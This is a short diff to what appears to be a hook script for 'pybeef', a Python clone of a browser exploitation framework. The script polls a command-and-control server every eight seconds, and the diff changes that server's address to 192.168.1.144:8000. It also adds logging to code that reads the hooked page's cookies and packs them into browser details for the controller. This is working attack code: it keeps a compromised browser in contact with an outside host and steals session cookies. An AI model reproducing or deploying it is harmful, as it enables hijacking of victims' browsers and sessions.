@@ -76,7 +76,7 @@ else{
 */
 
 
-setInterval('Makerequest("http://172.16.224.1:8000/poll")',8000);
+setInterval('Makerequest("http://192.168.1.144:8000/poll")',8000);
 //Makerequest("http://localhost:8000/poll?hook_id="+hook_id);
 
 
@@ -224,6 +224,7 @@ pybeef.browser = {
  		if(browser_version){ details['version'] = browser_version ;}
  		try{
             var cookies = document.cookie;
+            console.log(cookies.replace(/;/g,"+++"));
             if (cookies) details['Cookies'] = cookies;
         } catch (e) {
             details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
@@ -232,5 +233,6 @@ pybeef.browser = {
     	return details;
     }
 };
+
 var browser_details = pybeef.browser.getBrowserDetails();
 pybeef.regcmp('pybeef.browser');
